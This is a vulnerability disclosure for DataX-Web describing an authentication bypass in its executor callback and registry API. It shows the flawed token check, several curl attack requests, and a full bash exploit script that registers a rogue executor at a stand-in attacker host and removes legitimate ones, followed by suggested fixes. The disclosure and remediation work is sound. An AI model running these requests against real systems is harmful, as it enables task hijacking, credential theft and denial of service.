# Authentication Bypass Vulnerability in DataX-Web Executor Callback API

## NAME OF AFFECTED PRODUCT(S)

+ DataX-Web

## AFFECTED AND/OR FIXED VERSION(S)

### Vendor Homepage

+ https://github.com/WeiYe-Jing/datax-web

### Submitter

+ s1ain

### VERSION(S)

+ <= 2.1.2

### Software Link

+ https://github.com/WeiYe-Jing/datax-web

## PROBLEM TYPE

### Vulnerability Type

+ Authentication Bypass / Improper Authentication

### Root Cause

An authentication bypass vulnerability was found in the DataX-Web application's executor callback API endpoints. The root cause is that the AccessToken authentication mechanism contains a critical logic flaw: when the AccessToken is not configured (null or empty string), the authentication check is completely bypassed, allowing unauthenticated access to sensitive API endpoints. This occurs due to improper conditional logic in the token validation code.

### Impact

This vulnerability allows unauthenticated attackers to:

- Access executor callback endpoints without authentication
- Modify task execution results and status
- Register malicious executors
- Remove legitimate executors causing denial of service
- Bypass authentication when AccessToken is not configured (common in default installations)

## DESCRIPTION

DataX-Web uses an AccessToken mechanism to authenticate communication between the admin server and executor servers. However, the implementation contains a critical flaw where the authentication is only performed if the AccessToken is configured. If the AccessToken configuration is missing, null, or empty (which is the default state or can occur due to misconfiguration), all authentication checks are bypassed, allowing anyone to access the protected callback endpoints.

## Code Analysis

### Vulnerable Authentication Logic

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/controller/JobApiController.java`

```java
@RequestMapping("/callback")
@ApiOperation("Callback")
public ReturnT<String> callback(HttpServletRequest request,
                               @RequestBody(required = false) String data) {

    // Vulnerable authentication logic
    if (JobAdminConfig.getAdminConfig().getAccessToken()!=null
            && JobAdminConfig.getAdminConfig().getAccessToken().trim().length()>0
            && !JobAdminConfig.getAdminConfig().getAccessToken().equals(
                request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN))) {
        return new ReturnT<>(ReturnT.FAIL_CODE, "The access token is wrong.");
    }

    // If AccessToken is null or empty, authentication is skipped!
    // Process callback without authentication
    // ...
}

@RequestMapping("/processCallback")
@ApiOperation("Process Callback")
public ReturnT<String> processCallback(HttpServletRequest request,
                                      @RequestBody(required = false) String data) {
    // Same vulnerable pattern
    if (JobAdminConfig.getAdminConfig().getAccessToken()!=null
            && JobAdminConfig.getAdminConfig().getAccessToken().trim().length()>0
            && !JobAdminConfig.getAdminConfig().getAccessToken().equals(
                request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN))) {
        return new ReturnT<>(ReturnT.FAIL_CODE, "The access token is wrong.");
    }

    // Authentication bypassed if token not configured
    // ...
}

@RequestMapping("/registry")
@ApiOperation("Executor Registry")
public ReturnT<String> registry(HttpServletRequest request,
                               @RequestBody RegistryParam registryParam) {
    // Same vulnerability
    if (JobAdminConfig.getAdminConfig().getAccessToken()!=null
            && JobAdminConfig.getAdminConfig().getAccessToken().trim().length()>0
            && !JobAdminConfig.getAdminConfig().getAccessToken().equals(
                request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN))) {
        return new ReturnT<>(ReturnT.FAIL_CODE, "The access token is wrong.");
    }

    // Unauthenticated executor registration possible
    // ...
}

@RequestMapping("/registryRemove")
@ApiOperation("Executor Registry Remove")
public ReturnT<String> registryRemove(HttpServletRequest request,
                                     @RequestBody RegistryParam registryParam) {
    // Same vulnerability
    if (JobAdminConfig.getAdminConfig().getAccessToken()!=null
            && JobAdminConfig.getAdminConfig().getAccessToken().trim().length()>0
            && !JobAdminConfig.getAdminConfig().getAccessToken().equals(
                request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN))) {
        return new ReturnT<>(ReturnT.FAIL_CODE, "The access token is wrong.");
    }

    // Unauthenticated executor removal possible
    // ...
}
```

### Security Configuration - Endpoints Exposed

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/config/SecurityConfig.java`

```java
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.cors().and().csrf().disable()
            .authorizeRequests()
            .antMatchers("/static/**","/index.html","/favicon.ico","/avatar.jpg").permitAll()
            // These callback endpoints are intentionally excluded from JWT authentication
            .antMatchers("/api/callback","/api/processCallback",
                        "/api/registry","/api/registryRemove").permitAll()
            .antMatchers("/doc.html","/swagger-resources/**",
                        "/webjars/**","/*/api-docs").permitAll()
            .anyRequest().authenticated()
            // ...
}
```

These endpoints bypass Spring Security's JWT authentication and rely solely on the flawed AccessToken check.

### Logic Flaw Analysis

**When AccessToken is configured (e.g., "secret123"):**

```java
if (getAccessToken() != null                    // true
    && getAccessToken().trim().length() > 0     // true
    && !getAccessToken().equals(requestHeader)) // true if wrong token
{
    return fail("wrong token");
}
// Authentication enforced ✓
```

**When AccessToken is NOT configured (null or ""):**

```java
if (null != null                                // false - short circuit
    && ...
    && ...)
{
    return fail("wrong token");
}
// Authentication completely bypassed! ✗
```

### Vulnerability Location

**Affected Components:**

- `datax-admin/src/main/java/com/wugui/datax/admin/controller/JobApiController.java`
  - `callback` method (lines 38-42)
  - `processCallback` method (same pattern)
  - `registry` method (same pattern)
  - `registryRemove` method (same pattern)

**Affected Endpoints:**

- `/api/callback` - Task execution result callback
- `/api/processCallback` - Process status callback
- `/api/registry` - Executor registration
- `/api/registryRemove` - Executor deregistration

## Vulnerability Details and POC

### Precondition for Exploitation

The vulnerability is exploitable when:

1. AccessToken is not configured in `application.yml` (default installation)
2. AccessToken is set to null or empty string
3. Configuration file is misconfigured

**Default Configuration:**

```yaml
# application.yml - Default state
xxl:
  job:
    accessToken:    # Not configured - null by default
```

### Attack Vector 1: Manipulate Task Execution Results

```bash
# Without authentication, forge task success callback
curl -X POST http://target.com/api/callback \
  -H "Content-Type: application/json" \
  -d '[{
    "logId": 123,
    "logDateTime": 1699000000000,
    "executeResult": {
      "code": 200,
      "msg": "success"
    }
  }]'

# Response: {"code":200,"msg":null}
# Task 123 is marked as successful even if it failed
```

### Attack Vector 2: Register Malicious Executor

```bash
# Register attacker-controlled executor
curl -X POST http://target.com/api/registry \
  -H "Content-Type: application/json" \
  -d '{
    "registryGroup": "EXECUTOR",
    "registryKey": "datax-executor-malicious",
    "registryValue": "http://attacker.com:9999"
  }'

# Response: {"code":200,"msg":null}
# Malicious executor is now registered
# Future tasks may be routed to attacker's server
```

### Attack Vector 3: Denial of Service via Executor Removal

```bash
# Remove all legitimate executors
curl -X POST http://target.com/api/registryRemove \
  -H "Content-Type: application/json" \
  -d '{
    "registryGroup": "EXECUTOR",
    "registryKey": "datax-executor-prod",
    "registryValue": "http://legitimate-executor:9999"
  }'

# All executors removed, no tasks can execute
```

### Attack Vector 4: Process Callback Manipulation

```bash
# Fake process callback to hide malicious execution
curl -X POST http://target.com/api/processCallback \
  -H "Content-Type: application/json" \
  -d '[{
    "logId": 456,
    "logDateTime": 1699000000000,
    "executeResult": {
      "code": 200,
      "msg": "normal execution"
    }
  }]'

# Covers up malicious activity
```

### Complete Exploitation Example

```bash
#!/bin/bash
# Complete attack demonstrating authentication bypass

TARGET="http://target.com"

echo "[*] Testing if AccessToken is configured..."
RESPONSE=$(curl -s -X POST "$TARGET/api/callback" \
  -H "Content-Type: application/json" \
  -d '[{"logId":999,"executeResult":{"code":200}}]')

if echo "$RESPONSE" | grep -q '"code":200'; then
    echo "[+] SUCCESS! AccessToken is not configured - authentication bypassed"
    echo "[+] Vulnerable to unauthenticated attacks"
else
    echo "[-] AccessToken appears to be configured"
    exit 1
fi

echo ""
echo "[*] Step 1: Register malicious executor..."
curl -X POST "$TARGET/api/registry" \
  -H "Content-Type: application/json" \
  -d '{
    "registryGroup": "EXECUTOR",
    "registryKey": "malicious-executor",
    "registryValue": "http://attacker.com:4444"
  }'

echo ""
echo "[*] Step 2: Manipulate task results..."
for i in {1..100}; do
  curl -s -X POST "$TARGET/api/callback" \
    -H "Content-Type: application/json" \
    -d "[{\"logId\":$i,\"executeResult\":{\"code\":200,\"msg\":\"fake success\"}}]" &
done
wait

echo ""
echo "[*] Step 3: Remove legitimate executors (DoS)..."
curl -X POST "$TARGET/api/registryRemove" \
  -H "Content-Type: application/json" \
  -d '{
    "registryGroup": "EXECUTOR",
    "registryKey": "datax-executor-prod",
    "registryValue": "http://prod-executor:9999"
  }'

echo ""
echo "[+] Attack complete!"
echo "[+] - Malicious executor registered"
echo "[+] - Task results manipulated"
echo "[+] - Legitimate executors removed"
```

## Attack Results

### Successful Exploitation Indicators

**1. Authentication Bypass Confirmed:**

- Unauthenticated requests to `/api/callback` return success
- No "access token is wrong" error message
- Callbacks processed without authentication

**2. Task Result Manipulation:**

- Failed tasks marked as successful
- Successful tasks marked as failed
- Audit trail compromised

**3. Executor Registry Manipulation:**

- Malicious executors registered
- Future tasks may execute on attacker-controlled servers
- Data exfiltration possible

**4. Denial of Service:**

- All executors removed from registry
- Tasks cannot execute
- System becomes non-functional

### Real-World Impact

**Scenario 1: Data Exfiltration**

```
1. Attacker registers malicious executor at http://attacker.com:9999
2. Tasks are routed to malicious executor (round-robin or random strategy)
3. Malicious executor receives task configuration including:
   - Database connection strings
   - Credentials
   - Data to be synchronized
4. Attacker exfiltrates data and credentials
```

**Scenario 2: Cover Attack Tracks**

```
1. Attacker exploits command injection vulnerability
2. Task fails or logs show suspicious activity
3. Attacker uses /api/callback to mark task as successful
4. Logs show "normal execution"
5. Attack goes undetected
```

**Scenario 3: Business Disruption**

```
1. Attacker removes all executors via /api/registryRemove
2. All scheduled data synchronization tasks fail
3. Critical business data not synchronized
4. ETL pipelines broken
5. Business operations disrupted
```

## Suggested Repair

### 1. Fix Authentication Logic (Critical)

```java
@RequestMapping("/callback")
public ReturnT<String> callback(HttpServletRequest request,
                               @RequestBody(required = false) String data) {

    // Fixed: Always require AccessToken
    String configuredToken = JobAdminConfig.getAdminConfig().getAccessToken();
    String requestToken = request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN);

    // Enforce token configuration
    if (StringUtils.isBlank(configuredToken)) {
        logger.error("SECURITY: AccessToken not configured!");
        return new ReturnT<>(ReturnT.FAIL_CODE,
            "System configuration error - AccessToken not set");
    }

    // Enforce token in request
    if (StringUtils.isBlank(requestToken)) {
        logger.warn("SECURITY: Request without AccessToken from {}",
                   request.getRemoteAddr());
        return new ReturnT<>(ReturnT.FAIL_CODE,
            "Access token is required");
    }

    // Verify token match
    if (!configuredToken.equals(requestToken)) {
        logger.warn("SECURITY: Invalid AccessToken from {}",
                   request.getRemoteAddr());
        return new ReturnT<>(ReturnT.FAIL_CODE,
            "The access token is wrong");
    }

    // Authentication successful
    // ...
}
```

### 2. Validate Configuration at Startup (Critical)

```java
@Component
public class AccessTokenValidator implements ApplicationListener<ContextRefreshedEvent> {

    @Autowired
    private JobAdminConfig adminConfig;

    @Override
    public void onApplicationEvent(ContextRefreshedEvent event) {
        String accessToken = adminConfig.getAccessToken();

        if (StringUtils.isBlank(accessToken)) {
            throw new IllegalStateException(
                "SECURITY ERROR: xxl.job.accessToken must be configured in application.yml!\n" +
                "This is required for executor authentication.\n" +
                "Generate a strong token: openssl rand -base64 32"
            );
        }

        if (accessToken.length() < 32) {
            logger.warn("SECURITY WARNING: AccessToken is weak (length < 32). " +
                       "Consider using a stronger token.");
        }

        logger.info("AccessToken validation: OK (length: {})", accessToken.length());
    }
}
```

### 3. Use HMAC Signature Instead of Simple Token (Recommended)

```java
@RequestMapping("/callback")
public ReturnT<String> callback(HttpServletRequest request,
                               @RequestBody(required = false) String data) {

    // HMAC-based authentication
    String signature = request.getHeader("X-Signature");
    String timestamp = request.getHeader("X-Timestamp");

    if (!verifySignature(data, signature, timestamp)) {
        return new ReturnT<>(ReturnT.FAIL_CODE, "Invalid signature");
    }

    // Process callback
    // ...
}

private boolean verifySignature(String data, String signature, String timestamp) {
    try {
        // Prevent replay attacks - reject old timestamps
        long ts = Long.parseLong(timestamp);
        if (System.currentTimeMillis() - ts > 300000) { // 5 minutes
            return false;
        }

        // Calculate HMAC
        Mac hmac = Mac.getInstance("HmacSHA256");
        SecretKeySpec secretKey = new SecretKeySpec(
            accessToken.getBytes(StandardCharsets.UTF_8),
            "HmacSHA256"
        );
        hmac.init(secretKey);

        String payload = timestamp + data;
        byte[] hash = hmac.doFinal(payload.getBytes(StandardCharsets.UTF_8));
        String expectedSignature = Base64.getEncoder().encodeToString(hash);

        return expectedSignature.equals(signature);
    } catch (Exception e) {
        logger.error("Signature verification failed", e);
        return false;
    }
}
```

### 4. Add Rate Limiting (Recommended)

```java
@Component
public class CallbackRateLimiter {

    private final LoadingCache<String, AtomicInteger> requestCounts =
        CacheBuilder.newBuilder()
            .expireAfterWrite(1, TimeUnit.MINUTES)
            .build(new CacheLoader<String, AtomicInteger>() {
                @Override
                public AtomicInteger load(String key) {
                    return new AtomicInteger(0);
                }
            });

    public boolean allowRequest(String clientIp) {
        try {
            AtomicInteger count = requestCounts.get(clientIp);
            int currentCount = count.incrementAndGet();

            // Max 100 requests per minute per IP
            return currentCount <= 100;
        } catch (ExecutionException e) {
            return true; // Fail open
        }
    }
}

@RequestMapping("/callback")
public ReturnT<String> callback(HttpServletRequest request,
                               @RequestBody(required = false) String data) {
    // Rate limiting
    if (!rateLimiter.allowRequest(request.getRemoteAddr())) {
        logger.warn("SECURITY: Rate limit exceeded from {}",
                   request.getRemoteAddr());
        return new ReturnT<>(ReturnT.FAIL_CODE, "Rate limit exceeded");
    }

    // Authentication
    // ...
}
```

### 5. Add Comprehensive Audit Logging (Recommended)

```java
@RequestMapping("/callback")
public ReturnT<String> callback(HttpServletRequest request,
                               @RequestBody(required = false) String data) {
    String clientIp = request.getRemoteAddr();
    String requestToken = request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN);

    // Log all access attempts
    auditLogger.info("Callback request: ip={}, token_present={}, data_length={}",
                    clientIp,
                    requestToken != null,
                    data != null ? data.length() : 0);

    // Authentication
    if (!authenticateRequest(request)) {
        auditLogger.warn("SECURITY: Authentication failed: ip={}", clientIp);
        return new ReturnT<>(ReturnT.FAIL_CODE, "Authentication failed");
    }

    auditLogger.info("Callback processed: ip={}, success=true", clientIp);
    // ...
}
```

## Timeline

- **Discovery Date:** 2025-11-02
- **Vendor Notification:** TBD
- **Public Disclosure:** TBD

## References

- DataX-Web Repository: https://github.com/WeiYe-Jing/datax-web
- OWASP Authentication Cheat Sheet
- CWE-287: Improper Authentication
- CWE-306: Missing Authentication for Critical Function

## Credits

- Discovered by: s1ain
- Analysis Date: 2025-11-02
